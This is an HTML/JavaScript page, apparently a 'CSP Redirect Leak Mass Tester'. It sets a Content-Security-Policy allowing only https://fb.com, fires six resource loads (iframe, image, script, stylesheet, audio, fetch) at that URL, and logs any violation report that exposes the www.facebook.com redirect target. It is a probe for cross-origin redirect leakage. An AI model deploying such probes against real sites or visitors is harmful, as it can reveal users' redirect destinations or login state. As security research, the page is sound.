<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; frame-src https://fb.com; img-src https://fb.com; script-src 'unsafe-inline' 'self' https://fb.com; style-src 'unsafe-inline' 'self' https://fb.com; connect-src 'self' https://fb.com; media-src https://fb.com; object-src https://fb.com; form-action https://fb.com;">
    <title>Mass CSP Leak Tester - FIXED</title>
    <style>
        body { font-family: monospace; background: #1e1e1e; color: #fff; padding: 20px; }
        .log-card { background: #2d2d2d; border: 1px solid #444; padding: 15px; margin-top: 10px; border-radius: 5px; }
        .leak { color: #ff4444; font-weight: bold; }
        .safe { color: #aaa; }
        button { background: #00ff00; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

    <h2 style="color: #00ff00;">🔥 CSP Redirect Leak Mass Tester</h2>
    <button id="runBtn">Fire All Payloads</button>

    <div id="results"></div>
    <div id="hiddenZone" style="display: none;"></div>

    <script>
        const targetUrl = "https://fb.com/";
        const resultsDiv = document.getElementById('results');
        const hiddenZone = document.getElementById('hiddenZone');

        document.addEventListener('securitypolicyviolation', (e) => {
            const triggerName = e.target ? (e.target.tagName || 'API') : 'Unknown';
            const isLeaking = e.blockedURI.includes('www.facebook.com');
            const statusColor = isLeaking ? 'leak' : 'safe';
            const statusText = isLeaking ? '⚠️ REDIRECT LEAKED!' : '✅ Safe / Blocked normally';

            const card = document.createElement('div');
            card.className = 'log-card';
            card.innerHTML = `
                <div style="color: #88ccff;">[ ${triggerName} ] - Directive: ${e.violatedDirective}</div>
                <div>Status: <span class="${statusColor}">${statusText}</span></div>
                <div class="${statusColor}">Blocked URI: ${e.blockedURI}</div>
            `;
            resultsDiv.appendChild(card);
        });

        document.getElementById('runBtn').addEventListener('click', () => {
            resultsDiv.innerHTML = "";
            hiddenZone.innerHTML = "";

            // Test 1: Iframe
            const iframe = document.createElement('iframe');
            iframe.src = targetUrl;
            hiddenZone.appendChild(iframe);

            // Test 2: Image
            const img = document.createElement('img');
            img.src = targetUrl;
            hiddenZone.appendChild(img);

            // Test 3: Script
            const script = document.createElement('script');
            script.src = targetUrl;
            hiddenZone.appendChild(script);

            // Test 4: Stylesheet
            const link = document.createElement('link');
            link.rel = "stylesheet";
            link.href = targetUrl;
            hiddenZone.appendChild(link);

            // Test 5: Audio
            const audio = document.createElement('audio');
            audio.src = targetUrl;
            hiddenZone.appendChild(audio);

            // Test 6: Fetch API
            fetch(targetUrl, { mode: 'no-cors' }).catch(() => {});
        });
    </script>

</body>
</html>
